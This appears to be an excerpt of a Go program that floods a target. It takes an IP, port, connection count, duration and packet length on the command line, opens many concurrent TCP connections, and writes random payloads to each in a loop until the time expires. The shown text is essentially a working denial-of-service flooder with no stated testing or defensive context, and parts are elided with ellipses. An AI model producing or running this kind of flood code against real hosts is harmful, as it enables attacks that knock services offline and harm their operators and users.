...
func main() {
	if len(os.Args) != 6 {
		println("Usage: go run tcp.go <ip> <port> <connections> <time> <packet_length>")
		os.Exit(1)
	}
	...
	for i := 0; i < numConnections; i++ {
		wg.Add(1)
		go sendTCPPackets(&wg, addr, duration, packetLength)
	}

	wg.Wait()
}

func sendTCPPackets(wg *sync.WaitGroup, addr string, duration, packetLength int) {
	defer wg.Done()

	tcpPayload := generateRandomString(packetLength)

	timeout := time.Duration(duration) * time.Second
	endTime := time.Now().Add(timeout)

	conn, err := net.DialTimeout("tcp", addr, time.Duration(duration)*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()
	...
	for time.Now().Before(endTime) {
		_, err := conn.Write([]byte(tcpPayload))
		if err != nil {
			continue
		}
	}
